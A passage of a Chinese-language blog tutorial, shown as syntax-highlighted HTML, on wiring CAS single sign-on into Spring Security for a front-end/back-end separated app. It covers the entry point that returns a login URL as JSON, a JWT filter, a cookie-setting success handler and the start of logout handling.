punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"99\"></td><td><pre>        provider<span class=\"token punctuation\">.</span><span class=\"token function\">setAuthenticationUserDetailsService</span><span class=\"token punctuation\">(</span>customUserDetailsService<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        provider<span class=\"token punctuation\">.</span><span class=\"token function\">setKey</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CAS_PROVIDER_KEY\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        <span class=\"token keyword\">return</span> provider<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"102\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"103\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span>  </pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">CasAuthenticationFilter</span> <span class=\"token function\">casAuthenticationFilter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"106\"></td><td><pre>        <span class=\"token class-name\">CasAuthenticationFilter</span> casAuthenticationFilter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CasAuthenticationFilter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        casAuthenticationFilter<span class=\"token punctuation\">.</span><span class=\"token function\">setAuthenticationManager</span><span class=\"token punctuation\">(</span><span class=\"token function\">authenticationManager</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        casAuthenticationFilter<span class=\"token punctuation\">.</span><span class=\"token function\">setFilterProcessesUrl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/login\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"109\"></td><td><pre>        casAuthenticationFilter<span class=\"token punctuation\">.</span><span class=\"token function\">setAuthenticationSuccessHandler</span><span class=\"token punctuation\">(</span>casAuthenticationSuccessHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token keyword\">return</span> casAuthenticationFilter<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"112\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"113\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span>  </pre></td></tr><tr><td data-num=\"115\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">SecurityContextLogoutHandler</span> <span class=\"token function\">securityContextLogoutHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"116\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SecurityContextLogoutHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"118\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span>  </pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">LogoutFilter</span> <span class=\"token function\">logoutFilter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"121\"></td><td><pre>        <span class=\"token class-name\">LogoutFilter</span> logoutFilter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LogoutFilter</span><span class=\"token punctuation\">(</span>logoutSuccessHandler<span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"122\"></td><td><pre>                <span class=\"token function\">securityContextLogoutHandler</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"123\"></td><td><pre>        logoutFilter<span class=\"token punctuation\">.</span><span class=\"token function\">setFilterProcessesUrl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/logout\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"124\"></td><td><pre>        <span class=\"token keyword\">return</span> logoutFilter<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"126\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token annotation punctuation\">@Bean</span>  </pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">SingleSignOutFilter</span> <span class=\"token function\">singleSignOutFilter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"129\"></td><td><pre>        <span class=\"token class-name\">SingleSignOutFilter</span> singleSignOutFilter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SingleSignOutFilter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"130\"></td><td><pre>        singleSignOutFilter<span class=\"token punctuation\">.</span><span class=\"token function\">setIgnoreInitConfiguration</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"131\"></td><td><pre>        <span class=\"token keyword\">return</span> singleSignOutFilter<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"133\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"134\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"2-修改登录跳转\"><a class=\"anchor\" href=\"#2-修改登录跳转\">#</a> 2. 修改登录跳转</h1>\n<p>因为项目是前后端分离的方式，肯定是不会出现用户自行访问后端接口地址，然后跳转登录页面的情况，所以就需要修改 authenticationEntryPoint，使其返回一个登录地址，让前端去跳转。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Component</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CustomAuthenticationEntryPoint</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">AuthenticationEntryPoint</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// 配置文件中的 CAS 服务器地址  </span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;cas.server-host-login-url&#125;\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> serverHostLoginUrl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// 配置文件中的本应用前端地址  </span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;cas.client-host-url&#125;\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> clientHostUrl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">/**  </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>     * 处理未登录或登录超时的逻辑，因为项目前后端分离，此处直接返回一串地址，跳转至 CAS 端进行登录，   </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>     */</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">commence</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AuthenticationException</span> authException<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ServletException</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">// 构造未登录情况需要跳转的 login 页面 url  </span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">// 登录地址（指定的一个后台 controller 接口）  </span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">String</span> encodeUrl <span class=\"token operator\">=</span> <span class=\"token class-name\">URLEncoder</span><span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>clientHostUrl <span class=\"token operator\">+</span> <span class=\"token string\">\"/login\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">// CAS 认证中心页面地址，参数 service 带上登录地址，登录成功后会带上 ticket 跳转回 service 指定的地址  </span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token class-name\">String</span> redirectUrl <span class=\"token operator\">=</span> serverHostLoginUrl <span class=\"token operator\">+</span> <span class=\"token string\">\"?service=\"</span> <span class=\"token operator\">+</span> encodeUrl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        response<span class=\"token punctuation\">.</span><span class=\"token function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletResponse</span><span class=\"token punctuation\">.</span><span class=\"token constant\">SC_OK</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        response<span class=\"token punctuation\">.</span><span class=\"token function\">setHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content-type\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"application/json;charset=UTF-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        response<span class=\"token punctuation\">.</span><span class=\"token function\">setCharacterEncoding</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UTF-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token class-name\">PrintWriter</span> out <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token comment\">// 返回与前端约定的格式，前端能获取到 redirectUrl 跳转即可  </span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token class-name\">Result</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">></span></span> unauthorized <span class=\"token operator\">=</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">.</span><span class=\"token function\">unauthorized</span><span class=\"token punctuation\">(</span>redirectUrl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        out<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span>unauthorized<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>前端设置了全局拦截器后，这样不管请求什么接口，一旦状态码为 401，就会自动跳转到登录地址。</p>\n<h1 id=\"3-实现基于jwt认证\"><a class=\"anchor\" href=\"#3-实现基于jwt认证\">#</a> 3. 实现基于 Jwt 认证</h1>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Component</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">JwtAuthenticationTokenFilter</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">OncePerRequestFilter</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token annotation punctuation\">@Autowired</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">TokenService</span> tokenService<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doFilterInternal</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">FilterChain</span> chain<span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token class-name\">CasUserInfo</span> casUserInfo <span class=\"token operator\">=</span> tokenService<span class=\"token punctuation\">.</span><span class=\"token function\">getCasUser</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">Authentication</span> authentication <span class=\"token operator\">=</span> <span class=\"token class-name\">SecurityContextHolder</span><span class=\"token punctuation\">.</span><span class=\"token function\">getContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getAuthentication</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjectUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">isNotEmpty</span><span class=\"token punctuation\">(</span>casUserInfo<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name\">ObjectUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">isEmpty</span><span class=\"token punctuation\">(</span>authentication<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            tokenService<span class=\"token punctuation\">.</span><span class=\"token function\">verifyToken</span><span class=\"token punctuation\">(</span>casUserInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token class-name\">UsernamePasswordAuthenticationToken</span> authenticationToken <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">UsernamePasswordAuthenticationToken</span><span class=\"token punctuation\">(</span>casUserInfo<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> casUserInfo<span class=\"token punctuation\">.</span><span class=\"token function\">getAuthorities</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            authenticationToken<span class=\"token punctuation\">.</span><span class=\"token function\">setDetails</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">WebAuthenticationDetailsSource</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">buildDetails</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token class-name\">SecurityContextHolder</span><span class=\"token punctuation\">.</span><span class=\"token function\">getContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setAuthentication</span><span class=\"token punctuation\">(</span>authenticationToken<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        chain<span class=\"token punctuation\">.</span><span class=\"token function\">doFilter</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"3-登录成功处理\"><a class=\"anchor\" href=\"#3-登录成功处理\">#</a> 3. 登录成功处理</h1>\n<p>这一步是为了修改原本的成功跳转，改为生成 JWT token，并存储在 cookie 中。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Service</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CasAuthenticationSuccessHandler</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">SavedRequestAwareAuthenticationSuccessHandler</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>   <span class=\"token keyword\">private</span> <span class=\"token class-name\">RequestCache</span> requestCache <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HttpSessionRequestCache</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   <span class=\"token annotation punctuation\">@Autowired</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token keyword\">private</span> <span class=\"token class-name\">TokenService</span> tokenService<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>   <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;cas.web-url&#125;\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> webUrl<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token comment\">/**  </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    * 令牌有效期（默认 30 分钟）  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    */</span>  </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;token.expireTime&#125;\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> expireTime<span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token annotation punctuation\">@Override</span>  </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onAuthenticationSuccess</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                              <span class=\"token class-name\">Authentication</span> authentication<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">ServletException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token class-name\">String</span> targetUrlParameter <span class=\"token operator\">=</span> <span class=\"token function\">getTargetUrlParameter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isAlwaysUseDefaultTargetUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>targetUrlParameter <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name\">StringUtils</span><span class=\"token punctuation\">.</span><span class=\"token function\">hasText</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span>targetUrlParameter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>         requestCache<span class=\"token punctuation\">.</span><span class=\"token function\">removeRequest</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>         <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">onAuthenticationSuccess</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">,</span> authentication<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>         <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>      <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">clearAuthenticationAttributes</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token class-name\">CasUserInfo</span> userDetails <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">CasUserInfo</span><span class=\"token punctuation\">)</span> authentication<span class=\"token punctuation\">.</span><span class=\"token function\">getPrincipal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token class-name\">String</span> token <span class=\"token operator\">=</span> tokenService<span class=\"token punctuation\">.</span><span class=\"token function\">createToken</span><span class=\"token punctuation\">(</span>userDetails<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token comment\">// 往 Cookie 中设置 token  </span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token class-name\">Cookie</span> casCookie <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Cookie</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">TOKEN</span><span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      casCookie<span class=\"token punctuation\">.</span><span class=\"token function\">setMaxAge</span><span class=\"token punctuation\">(</span>expireTime <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      casCookie<span class=\"token punctuation\">.</span><span class=\"token function\">setPath</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>      response<span class=\"token punctuation\">.</span><span class=\"token function\">addCookie</span><span class=\"token punctuation\">(</span>casCookie<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      response<span class=\"token punctuation\">.</span><span class=\"token function\">setContentType</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"application/json;charset=utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token class-name\">PrintWriter</span> writer <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">getWriter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      writer<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">JSONObject</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJSONString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Result</span><span class=\"token punctuation\">.</span><span class=\"token function\">success</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"登录成功\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>      <span class=\"token comment\">// 登录成功后跳转到前端登录页面  </span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">//    getRedirectStrategy().sendRedirect(request, response, webUrl);  </span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"4-单点登出\"><a class=\"anchor\" href=\"#4-单点登出\">#</a> 4. 单点登出</h1>\n<p>刚开始对接的时候，不知道是前端使用了异步请求导致后端无法正常重定向，还是本身就不好实现，登出跳转总是出问题，所以干脆改成返回 json，再由前端跳转，和登录的步骤基本一致</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Configuration</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">LogoutSuccessHandlerImpl</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">LogoutSuccessHandler</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token annotation punctuation\">@Autowired</span>  </pre></td></tr><tr><td 